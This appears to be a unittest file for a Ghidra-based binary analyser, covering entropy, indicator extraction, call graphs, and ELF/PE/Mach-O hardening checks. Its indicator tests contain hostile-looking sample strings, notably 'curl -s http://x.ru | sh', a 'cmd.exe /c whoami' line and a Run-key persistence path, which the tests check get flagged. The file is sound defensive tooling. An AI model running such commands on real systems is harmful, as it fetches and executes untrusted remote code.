"""Tests for entropy, indicators, call graph and hardening insights."""

import shutil
import struct
import subprocess
import tempfile
import unittest
from pathlib import Path

from ghidra_syscall_analyzer.binary_insights import (
    callers_by_function,
    classify_origins,
    extract_indicators,
    hardening,
    header_hardening,
    shannon_entropy,
)

SAMPLES = Path(__file__).resolve().parent.parent / "ghidra_syscall_analyzer" / "samples"


class TestEntropy(unittest.TestCase):

    def test_bounds(self) -> None:
        self.assertEqual(shannon_entropy(b""), 0.0)
        self.assertEqual(shannon_entropy(b"\x00" * 100), 0.0)
        self.assertAlmostEqual(shannon_entropy(bytes(range(256))), 8.0)
        self.assertAlmostEqual(shannon_entropy(b"ab" * 50), 1.0)


class TestIndicators(unittest.TestCase):

    def extract(self, *values):
        strings = [
            {"address": f"1000{i}", "value": v, "referenced_by": [{"function": "beacon", "at": "4000"}]}
            for i, v in enumerate(values)
        ]
        return {(i["kind"], i["value"]) for i in extract_indicators(strings)}

    def test_network_indicators(self) -> None:
        found = self.extract("http://evil.example.com/a?b=1", "connect 10.0.0.5:4444", "ops@corp.io")
        self.assertIn(("url", "http://evil.example.com/a?b=1"), found)
        self.assertIn(("domain", "evil.example.com"), found)
        self.assertIn(("ipv4", "10.0.0.5"), found)
        self.assertIn(("email", "ops@corp.io"), found)

    def test_paths_registry_and_commands(self) -> None:
        found = self.extract(
            "/tmp/output.dat",
            "C:\\Windows\\System32\\cmd.exe /c whoami",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "curl -s http://x.ru | sh",
        )
        self.assertIn(("unix_path", "/tmp/output.dat"), found)
        self.assertIn(("windows_path", "C:\\Windows\\System32\\cmd.exe"), found)
        self.assertIn(("registry_key", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"), found)
        self.assertIn(("command", "curl -s http://x.ru | sh"), found)
        self.assertIn(("command", "C:\\Windows\\System32\\cmd.exe /c whoami"), found)

    def test_no_false_positives_on_binary_noise(self) -> None:
        self.assertEqual(self.extract("libSystem.B.dylib", "__TEXT", "GLIBC_2.2.5", "version 1.2.3", "_open", "-la"), set())

    def test_indicator_carries_referencing_functions(self) -> None:
        [indicator] = extract_indicators([
            {"address": "1000", "value": "/bin/ls", "referenced_by": [{"function": "_process_execution", "at": "2000"}]}
        ])
        self.assertEqual(indicator["string_address"], "1000")
        self.assertEqual(indicator["referenced_by"], ["_process_execution"])


class TestCallGraph(unittest.TestCase):

    def test_reverse_edges(self) -> None:
        functions = [
            {"name": "entry", "callsites": [{"to": "a", "at": "1"}, {"to": "b", "at": "2"}]},
            {"name": "a", "callsites": [{"to": "b", "at": "3"}]},
            {"name": "b", "callsites": []},
        ]
        self.assertEqual(callers_by_function(functions), {"a": ["entry"], "b": ["a", "entry"]})


def _pe_bytes(dll_characteristics: int) -> bytes:
    e_lfanew = 0x40
    data = bytearray(e_lfanew + 24 + 96)
    data[0:2] = b"MZ"
    struct.pack_into("<I", data, 0x3C, e_lfanew)
    data[e_lfanew:e_lfanew + 4] = b"PE\x00\x00"
    struct.pack_into("<H", data, e_lfanew + 24, 0x20B)  # PE32+ optional header magic
    struct.pack_into("<H", data, e_lfanew + 24 + 70, dll_characteristics)
    return bytes(data)


class TestHeaderHardening(unittest.TestCase):

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def _gcc(self, name: str, *flags: str) -> Path:
        if not shutil.which("gcc"):
            self.skipTest("gcc not available")
        out = self.tmp / name
        result = subprocess.run(["gcc", "-O0", *flags, "-o", str(out), str(SAMPLES / "sample_binary.c")],
                                capture_output=True)
        if result.returncode != 0:
            self.skipTest(f"gcc could not build an ELF here: {result.stderr.decode()[:200]}")
        if out.read_bytes()[:4] != b"\x7fELF":
            self.skipTest("gcc does not produce ELF on this platform")
        return out

    def test_hardened_elf(self) -> None:
        binary = self._gcc("hard", "-fPIE", "-pie", "-Wl,-z,relro,-z,now")
        self.assertEqual(header_hardening(binary), {"format": "ELF", "pie": True, "nx": True, "relro": "full"})

    def test_partial_relro_elf(self) -> None:
        binary = self._gcc("partial", "-fPIE", "-pie", "-Wl,-z,relro,-z,lazy")
        self.assertEqual(header_hardening(binary)["relro"], "partial")

    def test_unhardened_elf(self) -> None:
        binary = self._gcc("soft", "-no-pie", "-z", "execstack", "-Wl,-z,norelro")
        self.assertEqual(header_hardening(binary), {"format": "ELF", "pie": False, "nx": False, "relro": "none"})

    def test_macho_sample(self) -> None:
        result = header_hardening(SAMPLES / "sample_binary")
        self.assertEqual(result["format"], "Mach-O")
        self.assertTrue(result["pie"])
        self.assertTrue(result["nx"])

    def test_pe_flags(self) -> None:
        path = self.tmp / "app.exe"
        path.write_bytes(_pe_bytes(0x0040 | 0x0100 | 0x4000))
        result = header_hardening(path)
        self.assertEqual((result["format"], result["pie"], result["nx"], result["control_flow_guard"]), ("PE", True, True, True))

        path.write_bytes(_pe_bytes(0))
        result = header_hardening(path)
        self.assertEqual((result["pie"], result["nx"], result["control_flow_guard"]), (False, False, False))

    def test_unknown_format(self) -> None:
        path = self.tmp / "blob"
        path.write_bytes(b"\x00" * 64)
        self.assertEqual(header_hardening(path), {"format": None, "pie": None, "nx": None, "relro": None})


class TestCombinedHardening(unittest.TestCase):

    def test_signals_from_facts(self) -> None:
        facts = {
            "imports": [{"name": "___stack_chk_fail"}, {"name": "___memcpy_chk"}, {"name": "_open"}],
            "functions": [
                {"name": "FUN_00101000", "is_thunk": False},
                {"name": "FUN_00101100", "is_thunk": False},
                {"name": "main", "is_thunk": False},
                {"name": "_open", "is_thunk": True},
            ],
            "memory_map": [{"name": "__TEXT", "permissions": "r-x"}, {"name": "__jit", "permissions": "rwx"}],
        }
        result = hardening(SAMPLES / "sample_binary", facts)
        self.assertTrue(result["stack_canary"])
        self.assertTrue(result["fortify_source"])
        self.assertEqual(result["rwx_sections"], ["__jit"])
        self.assertTrue(result["stripped"])

    def test_unknown_when_facts_missing(self) -> None:
        result = hardening(SAMPLES / "sample_binary", {})
        self.assertFalse(result["stack_canary"])
        self.assertIsNone(result["rwx_sections"])
        self.assertIsNone(result["stripped"])


class TestOriginClassification(unittest.TestCase):

    def facts(self):
        ref = [{"function": "main", "at": "2010"}]
        return {
            "memory_map": [
                {"name": "__TEXT", "start": "1000", "end": "13ff"},
                {"name": "__text", "start": "1400", "end": "1fff"},
                {"name": "__cstring", "start": "2000", "end": "20ff"},
                {"name": "__LINKEDIT", "start": "8000", "end": "8fff"},
            ],
            "functions": [{"name": "main", "address": "1400"}],
            "data_types": [
                {"name": "dylib_command", "path": "/MachO/dylib_command", "used_by": ["data:1020"]},
                {"name": "mach_header", "path": "/MachO/mach_header", "used_by": ["data:1000", "parse_self"]},
                {"name": "sockaddr", "path": "/socket.h/sockaddr", "used_by": ["main"]},
            ],
            "globals": [
                {"address": "1000", "type": "mach_header", "size": 32, "section": "__TEXT", "referenced_by": []},
                {"address": "1020", "type": "dylib_command", "size": 24, "section": "__TEXT", "referenced_by": []},
                {"address": "8000", "type": "uleb128", "size": 1, "section": "__LINKEDIT", "referenced_by": []},
                {"address": "8010", "type": "dword", "size": 4, "section": "__LINKEDIT", "referenced_by": ref},
                {"address": "2080", "type": "pointer", "size": 8, "section": "__cstring", "referenced_by": []},
            ],
            "strings": [
                {"address": "1028", "value": "__TEXT", "section": "__TEXT", "referenced_by": []},
                {"address": "1038", "value": "/usr/lib/libSystem.B.dylib", "section": "__TEXT", "referenced_by": []},
                {"address": "8100", "value": "_open", "section": "__LINKEDIT", "referenced_by": []},
                {"address": "2000", "value": "/bin/ls", "section": "__cstring", "referenced_by": ref},
                {"address": "2010", "value": "-la", "section": "__cstring", "referenced_by": []},
            ],
        }

    def test_tags_loader_metadata_and_keeps_program_content(self) -> None:
        facts = self.facts()
        counts = classify_origins(facts)

        origin = lambda section: [x["origin"] for x in facts[section]]
        # mach_header is used by a function, so it stays program content.
        self.assertEqual(origin("data_types"), ["file_format", "program", "program"])
        # Referenced LINKEDIT data and program pointers are program content.
        self.assertEqual(origin("globals"), ["file_format", "file_format", "file_format", "program", "program"])
        # The library path sits just past its struct but inside the header-only block.
        self.assertEqual(origin("strings"), ["file_format", "file_format", "file_format", "program", "program"])
        self.assertEqual(counts, {"strings": 3, "globals": 3, "data_types": 1})

    def test_indicators_inherit_string_origin(self) -> None:
        facts = self.facts()
        classify_origins(facts)
        origins = {i["value"]: i["origin"] for i in extract_indicators(facts["strings"])}
        self.assertEqual(origins["/usr/lib/libSystem.B.dylib"], "file_format")
        self.assertEqual(origins["/bin/ls"], "program")


if __name__ == "__main__":
    unittest.main()
